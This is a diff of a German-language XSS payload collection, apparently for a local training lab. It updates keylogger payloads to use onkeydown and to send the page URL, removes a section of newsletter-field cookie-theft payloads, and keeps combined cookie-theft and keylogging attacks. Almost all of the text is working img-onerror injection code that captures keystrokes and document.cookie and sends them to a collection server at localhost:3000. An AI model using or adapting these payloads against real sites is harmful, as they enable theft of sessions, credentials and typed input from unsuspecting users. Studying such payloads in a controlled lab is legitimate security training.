@@ -221,7 +221,7 @@ Diese Payloads funktionieren eigenständig im Browser und benötigen keine exter
 ### Einfacher Keylogger (Console)
 
 ```html
-<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;console.log('KEYS:'+k)}">
+<img src=x onerror="var k='';document.onkeydown=function(e){k+=e.key;console.log('KEYS:'+k)}">
 ```
 
 ---
@@ -229,7 +229,7 @@ Diese Payloads funktionieren eigenständig im Browser und benötigen keine exter
 ### Keylogger mit Alert nach 10 Zeichen
 
 ```html
-<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>10)alert('Captured:'+k)}">
+<img src=x onerror="var k='';document.onkeydown=function(e){k+=e.key;if(k.length>10)alert('Captured:'+k)}">
 ```
 
 ---
@@ -298,7 +298,7 @@ npm start
 ### Keylogger der an Server sendet (alle 20 Zeichen)
 
 ```html
-<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+encodeURIComponent(k));k=''}}">
+<img src=x onerror="var k='';document.onkeydown=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+encodeURIComponent(k)+'&u='+location.href);k=''}}">
 ```
 
 ---
@@ -306,7 +306,7 @@ npm start
 ### Keylogger mit kürzerer Übertragung (alle 10 Zeichen)
 
 ```html
-<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>10){new Image().src='http://localhost:3000/keys?d='+k;k=''}}">
+<img src=x onerror="var k='';document.onkeydown=function(e){k+=e.key;if(k.length>10){new Image().src='http://localhost:3000/keys?d='+encodeURIComponent(k)+'&u='+location.href;k=''}}">
 ```
 
 ---
@@ -314,48 +314,12 @@ npm start
 ### Keylogger mit sofortiger Übertragung (jeder Tastendruck)
 
 ```html
-<img src=x onerror="document.onkeypress=function(e){fetch('http://localhost:3000/keys?d='+e.key)}">
+<img src=x onerror="document.onkeydown=function(e){fetch('http://localhost:3000/keys?d='+e.key+'&u='+location.href)}">
 ```
 
 ---
 
-## 2.3 Newsletter Payloads (mit @ und Server)
-
-Diese Payloads sind speziell für das Newsletter-Feld konzipiert, das ein @-Zeichen erfordert.
-
-### E-Mail mit Cookie-Diebstahl (fetch)
-
-```html
-test@test.de<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
-```
-
----
-
-### E-Mail mit Cookie-Diebstahl (Image)
-
-```html
-mail@example.com<img src=x onerror="new Image().src='http://localhost:3000/steal?c='+document.cookie">
-```
-
----
-
-### E-Mail mit vollständigen Daten (POST)
-
-```html
-user@domain.de<img src=x onerror="fetch('http://localhost:3000/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({c:document.cookie,u:location.href,a:navigator.userAgent})})">
-```
-
----
-
-### E-Mail mit Keylogger
-
-```html
-test@test.de<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+k);k=''}}">
-```
-
----
-
-## 2.4 Kombinations-Angriffe (mit Server)
+## 2.3 Kombinations-Angriffe (mit Server)
 
 ### Cookie-Diebstahl + Phishing Login-Form
 
@@ -368,7 +332,7 @@ test@test.de<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.ke
 ### Cookie-Diebstahl + Keylogger gleichzeitig
 
 ```html
-<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie);var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+k);k=''}}">
+<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie);var k='';document.onkeydown=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+encodeURIComponent(k)+'&u='+location.href);k=''}}">
 ```
 
 ---
@@ -444,7 +408,6 @@ http://localhost:8080/index.html?search=<img src=x onerror="fetch('http://localh
 ## Angriffe MIT Server:
 - Cookie-Diebstahl mit Übertragung
 - Keylogger mit Datenübertragung
-- Newsletter-spezifische Angriffe
 - Kombinations-Angriffe
 - Vollständige Datenerfassung
 
